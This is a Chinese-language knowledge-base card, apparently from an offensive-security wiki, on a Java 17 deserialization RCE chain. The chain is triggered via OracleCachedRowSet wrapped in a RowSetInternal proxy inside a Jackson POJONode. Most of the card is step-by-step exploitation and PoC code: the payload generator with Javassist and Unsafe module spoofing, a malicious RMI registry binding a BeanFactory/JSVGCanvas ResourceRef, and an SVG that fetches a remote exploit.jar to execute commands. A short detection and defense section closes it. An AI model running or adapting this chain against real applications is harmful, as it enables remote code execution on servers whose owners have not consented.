---
id: web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi
title: Java 17 Oracle JDBC RowSet 反序列化触发 RMI JNDI：POJONode+EventListenerList+动态代理包装 OracleCachedRowSet
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: oracle-rowset-jdk17-pojo-proxy-rmi-jndi
tags:
- java
- deserialization
- jndi
- rmi
- oracle
- ojdbc
- jackson
- pojonode
- eventlistenerlist
- jdk17
- gadget-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:54:21+08:00'
  notes: 已对照原文与图01-04核对：/dbtest Utils.deserialize readObject入口、ojdbc11-21.14.0.0依赖、OracleCachedRowSet/FiltedRowSet/JoinRowSet/WebRowSet候选、getConnectionInternal的validateJNDIName只能走rmi、RowSetInternal动态代理、POJONode(proxy)+UndoManager.edits+EventListenerList.listenerList、Javassist删BaseJsonNode.writeReplace、Unsafe patchModule、--add-opens java.base/java.lang=ALL-UNNAMED均与原文一致；原文未给出RMI回连成功截图，链完整性与命令执行需实测；dup-scan与18893 Spring AOP PriorityQueue链为related非同链
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi/
draft: false
kb_aliases:
- Oracle JDBC 反序列化
- OracleCachedRowSet 反序列化
- OracleFilteredRowSet
- OracleJoinRowSet
- OracleWebRowSet
- validateJNDIName
- RowSetInternal 代理
- POJONode 触发 JNDI
---

## 一句话结论

Java 17 应用存在原生反序列化入口且 classpath 含 `ojdbc11` 时，可用 `OracleCachedRowSet`（或继承它的 `OracleFilteredRowSet`/`OracleJoinRowSet`/`OracleWebRowSet`）作为 JNDI 触发器：用 `EventListenerList → UndoManager.toString → Vector.toString → POJONode.toString` 触发 Jackson 序列化一个包装了 `OracleCachedRowSet` 的 `RowSetInternal` 动态代理，代理调用 `getConnectionInternal` 发起 JNDI 查找；由于该方法内有 `validateJNDIName` 校验，必须使用 `rmi://` 而非 `ldap://`。把 RMI registry 返回的 `ResourceRef` 指向上篇的 Tomcat `BeanFactory` + Batik 链（或其它本地工厂链）即可 RCE。

## 原理

- **入口**：控制器 `POST /dbtest` 把用户参数 `data` 交给 `Utils.deserialize`：Base64 解码后直接 `new ObjectInputStream(...).readObject()`。虽然随后会 `DriverManager.getConnection(url, username, password)`，但 `url`/`driver` 来自配置文件，不能通过反序列化控制 JDBC URL；真正的攻击面是这一次 `readObject`。
- **Oracle RowSet 的 JNDI 触发点**：`oracle.jdbc.rowset.OracleCachedRowSet` 在建立连接/反序列化相关路径中会调用 `getConnectionInternal`，该方法对 `dataSourceName` 做 `validateJNDIName` 校验并执行 JNDI 查找。`OracleFilteredRowSet`、`OracleJoinRowSet` 继承自 `OracleCachedRowSet`，同样命中该路径；`OracleWebRowSet` 也可作为候选。原文在依赖列表中确认存在 `ojdbc11-21.14.0.0`。
- **为什么必须用 RMI**：`validateJNDIName` 会限制可用的 JNDI 协议；原文实测只有 `rmi://` 能通过，`ldap://` 被拦。因此 RMI registry 是这条链的必需出口。
- **为什么要动态代理**：直接让 Jackson 序列化 `OracleCachedRowSet` 不能稳定走到目标 getter，且容易受类型/接口限制。用 JDK 动态代理实现 `RowSetInternal`（`OracleCachedRowSet` 本身实现的接口之一），把 `OracleCachedRowSet` 作为代理目标，Jackson 把代理当接口 Bean 序列化时会调用接口 getter，代理转发到 `OracleCachedRowSet.getConnectionInternal`，从而发起 JNDI 查找。原文的建议是“挨个试 `OracleCachedRowSet` 实现的接口，哪个套上不报错用哪个”，最终选择 `RowSetInternal`。
- **source 触发**：把 `POJONode(proxy)` 放进 `UndoManager.edits`（`Vector`），再把 `UndoManager` 与一个监听器类型 `InternalError.class` 成对放入 `EventListenerList.listenerList`。反序列化 `EventListenerList` 时 `readObject → add → UndoManager.toString → Vector.toString → String.valueOf → POJONode.toString`，Jackson 开始序列化代理对象，触发上述 getter。
- **POJONode 序列化修正**：Jackson 的 `BaseJsonNode.writeReplace` 会在序列化时把节点替换掉，导致 POJONode 不能原样落盘。生成端用 Javassist 从 `com.fasterxml.jackson.databind.node.BaseJsonNode` 删除 `writeReplace` 方法（只影响生成 payload 的 JVM），再序列化即可让目标端得到 POJONode 对象图。
- **Java 17 模块化**：`OracleCachedRowSet`、`ProxyUtil`、`SerializeUtil`、`UnsafeUtil`、`ReflectUtil` 等自定义类在 JDK 17 下可能因模块访问受限；原文用 `Unsafe` 把每个类的 `Class.module` 字段改写为 `Object.class.getModule()`（`java.base`），相当于给这些类“伪造 java.base 身份”以绕过模块检查。运行端还需要 `--add-opens java.base/java.lang=ALL-UNNAMED`；使用 RMI 内部实现时需 `--add-modules jdk.naming.rmi` 和 `--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED`（编译/运行按需添加）。
- **JNDI 出口**：RMI registry 绑定一个 `ReferenceWrapper(ResourceRef)`，`ResourceRef` 的类为 `org.apache.batik.swing.JSVGCanvas`、工厂为 `org.apache.naming.factory.BeanFactory`，属性 `URI` 指向攻击者的 SVG；Tomcat BeanFactory 实例化 JSVGCanvas 并调用 `setURI`，Batik 解析 SVG 中的 `application/java-archive` script，从远程 jar 的 `SVG-Handler-Class` 加载并执行 `EventListenerInitializer`（详见关联卡）。

## 触发条件

- 目标为 Java 17（或相近高版本），存在可控的原生反序列化入口（本例 `ObjectInputStream.readObject`）。
- classpath 含 `ojdbc11`（Oracle JDBC RowSet 类），且未对 `EventListenerList`/`UndoManager`/`POJONode`/`OracleCachedRowSet`/动态代理做反序列化白名单拦截。
- 攻击者能运行 RMI registry（如 1097 端口）并让目标访问；`validateJNDIName` 路径允许该 RMI 地址。
- 目标 JVM 可用 `sun.misc.Unsafe`；需要时能加 `--add-opens java.base/java.lang=ALL-UNNAMED`（以及 RMI 相关的 `--add-modules`/`--add-exports`）。
- JNDI 返回值能落到本地工厂链（Tomcat `BeanFactory` + Batik JSVGCanvas 等），且目标 classpath 有对应类。

## 利用步骤

1. 确认入口：向 `/dbtest` 提交 Base64 序列化数据，服务端 `Utils.deserialize` 直接 `readObject`；确认依赖含 `ojdbc11`、Jackson、Spring、Tomcat、Batik。
2. 生成端用 Javassist 删除 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace`，避免 POJONode 在序列化时被替换。
3. 用 `Unsafe` 对 `OracleCachedRowSetChain`、`ProxyUtil`、`SerializeUtil`、`UnsafeUtil`、`ReflectUtil` 等类执行 `patchModule`：取 `Class.class` 的 `module` 字段偏移，用 `unsafe.getAndSetObject(clazz, addr, Object.class.getModule())` 把类的模块改成 `java.base`。
4. 创建 `OracleCachedRowSet`，`setDataSourceName("rmi://127.0.0.1:1097/remoteobj")`。
5. 用 `ProxyUtil.getBProxy(oracleCachedRowSet, new Class[]{RowSetInternal.class})` 生成动态代理；Jackson 序列化该代理时会调用 `RowSetInternal` 的 getter 并转发到 Oracle RowSet 的 `getConnectionInternal`。
6. 构造 `POJONode(proxy)`；取 `UndoManager` 的 `edits`（`Vector`，位于 `CompoundEdit`），加入 POJONode；构造 `EventListenerList`，把 `listenerList` 设为 `new Object[]{InternalError.class, manager}`。
7. 序列化 `EventListenerList` 得到 payload，Base64 后提交到 `/dbtest`；反序列化时触发 POJONode.toString → Jackson → 代理 → Oracle RowSet → RMI JNDI 查找。
8. 启动 RMI registry 并绑定恶意 `ResourceRef`（Batik/BeanFactory），启动 SVG 与 jar 的 HTTP 服务；目标 JNDI 查找返回 ResourceRef，Tomcat BeanFactory 实例化 JSVGCanvas，Batik 加载 SVG 中的远程 jar 并执行 `EventListenerInitializer`，完成命令执行。
9. 原文提示该链可能需要多试几次（JNDI/类加载时序），以命令执行回显/弹计算器为准。

## PoC

```java
// 生成端关键代码（原文 OracleCachedRowSetChain 精简）
UnsafeUtil.patchModule(OracleCachedRowSetChain.class);
UnsafeUtil.patchModule(ProxyUtil.class);
UnsafeUtil.patchModule(SerializeUtil.class);
UnsafeUtil.patchModule(UnsafeUtil.class);
UnsafeUtil.patchModule(ReflectUtil.class);

OracleCachedRowSet rowSet = new OracleCachedRowSet();
rowSet.setDataSourceName("rmi://127.0.0.1:1097/remoteobj");

ClassPool cp = ClassPool.getDefault();
cp.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
CtClass ct = cp.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
ct.toClass();

Proxy proxy = (Proxy) ProxyUtil.getBProxy(rowSet, new Class[]{RowSetInternal.class});
POJONode node = new POJONode(proxy);

EventListenerList exp = new EventListenerList();
UndoManager manager = new UndoManager();
Vector edits = (Vector) UnsafeUtil.getFieldValue(manager, "edits");
edits.add(node);
UnsafeUtil.setFieldValue(exp, "listenerList", new Object[]{InternalError.class, manager});

byte[] payload = SerializeUtil.serialize(exp); // Base64 后提交 /dbtest
```

```java
// RMI registry 返回的 ResourceRef（Batik 出口，节选自原文）
Registry registry = LocateRegistry.createRegistry(1097);
ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("URI", "http://localhost:8886/1.xml"));
registry.bind("remoteobj", new ReferenceWrapper(ref));
```

SVG 与 jar：

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0">
  <script type="application/java-archive" xlink:href="http://localhost:8887/exploit.jar"/>
  <text>Static text ...</text>
</svg>
```

```text
MANIFEST.MF:
Manifest-Version: 1.0
Main-Class: Main
SVG-Handler-Class: Main
```

`Main` 实现 `org.w3c.dom.svg.EventListenerInitializer`，在 `initializeEventListeners(SVGDocument)` 中执行命令。

## 变体与关联

- **同一 JNDI 出口的 Batik 链**：[[web-java-deserialization-jndi-batik-jsvgcanvas-beanfactory-svg-jar]] 详细拆解 `BeanFactory + JSVGCanvas + SVG application/java-archive + SVG-Handler-Class` 的执行原理；本卡负责“如何从反序列化走到这个 JNDI 出口”。
- **Jackson/POJONode 触发**：[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（EventListenerList 触发任意 toString）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（POJONode 经 Spring AOP 代理触发 TemplatesImpl）解释了 source 与 POJONode 序列化细节；本卡把 sink 换成 Oracle RowSet 的 JNDI。
- **JDK17 模块绕过**：[[web-java-classloader-jdk17-class-module-field-spoof]] 解释 `Unsafe` 改 `Class.module` 的原理；本卡的 `patchModule` 是同一手法的批量化封装。
- **LdapAttribute 变体**：原文另附 Jackson `POJONode` + `com.sun.jndi.ldap.LdapAttribute` 链，经自建 LDAP 服务器返回同样的 `ResourceRef`（Tomcat BeanFactory + Batik）。该变体在本环境未给出成功复现证据（原文也提到 yaml 测试未成功），需自建 LDAP 服务器并验证，故未单独成卡。
- **TemplatesImpl 新时代链**：原文提到在依赖齐全时可直接用 Jackson `POJONode` + 动态代理 `TemplatesImpl` 通杀（参考 [[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]），不需要 Oracle RowSet；本卡适用于 `TemplatesImpl` 被黑名单/模块限制或想走 JNDI 出口的场景。
- **边界**：`validateJNDIName` 只允许 RMI；目标不能访问 RMI 端口、缺少 ojdbc/Jackson、POJONode 被白名单拦截、RMI 返回的本地工厂类不在 classpath 时链不成立。

## 检测与防御

- **检测**：`/dbtest` 等接口收到 Base64 原生序列化流，流中出现 `EventListenerList`、`UndoManager`、`com.fasterxml.jackson.databind.node.POJONode`、`java.lang.reflect.Proxy`、`oracle.jdbc.rowset.Oracle*RowSet`；进程向外部 RMI registry（1097 等）发起 JNDI 查找；随后加载 `org.apache.batik.swing.JSVGCanvas` 并访问远程 SVG/jar。
- **防御**：禁止对不可信输入使用 `ObjectInputStream`，改用 JSON/白名单绑定；若必须反序列化，使用 `ObjectInputFilter` 白名单并覆盖 `EventListenerList`/`UndoManager`/`POJONode`/代理类/Oracle RowSet；升级/移除不必要的 `ojdbc`、Batik、Tomcat 本地工厂类；JDK 17 保持强封装，不要为业务加宽松的 `--add-opens`；限制出站 RMI/LDAP/HTTP。
- **响应**：排查反序列化入口的异常请求、JNDI/RMI 出站连接、Batik/BeanFactory 类加载与临时 jar 下载；隔离主机并审计 classpath 中的第三方 gadget 依赖。
